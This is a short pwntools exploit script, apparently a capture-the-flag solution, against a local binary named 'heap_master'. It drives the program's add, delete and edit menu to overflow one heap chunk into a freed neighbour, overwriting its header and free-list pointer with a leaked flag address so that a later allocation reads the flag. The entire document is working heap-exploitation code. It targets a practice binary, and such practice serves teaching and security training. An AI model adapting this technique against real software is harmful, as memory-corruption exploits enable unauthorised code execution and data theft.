from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./heap_master')

flag_addr = int(r.recvline().strip().split()[1], 16)
info(f'flag addr : {hex(flag_addr)}')

def add(idx):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', str(idx).encode())

def delete(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(idx).encode())

def edit(idx, size, msg):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', str(idx).encode())
    r.sendlineafter(b'> ', str(size).encode())
    r.send(msg)

add(0)
add(1)
add(2)

delete(1)

edit(0, 0x10, flat(
    0, 0, 0, 0x21, 
    flag_addr,
))

r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', b'2')

r.interactive()